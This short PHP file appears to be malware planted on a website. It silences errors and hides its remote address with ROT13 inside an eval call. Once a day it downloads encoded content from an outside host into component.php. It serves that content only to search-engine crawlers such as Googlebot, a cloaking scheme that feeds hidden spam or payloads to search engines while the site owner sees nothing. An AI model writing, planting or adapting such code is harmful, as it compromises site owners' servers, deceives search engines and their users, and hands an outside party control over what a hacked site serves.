<?php
	error_reporting(0);
	ini_set('display_errors',0);
	$url = $_SERVER['HTTP_HOST']; 
	$url = str_replace("&", "",$url);
	$nonhttp = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "component.php";
  	$cachetime = 1 * 24 * 60 * 60; //2 * 24 * 60 * 60
	$access = array('Googlebot','Yahoo','msnbot','Googlebot-Mobile');
	if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {    
		eval(str_rot13('$fbhepr = "uggc://nmgrzcyngrf.pbz/o/og.cuc?fvgr=".$hey;'));
		$string = str_rot13(file_get_contents($source));
		$result = file_put_contents($target, $string);}
	foreach ($access as $engines){if (preg_match("/$engines/", $_SERVER['HTTP_USER_AGENT']))
	echo str_rot13 (file_get_contents($target));}
?>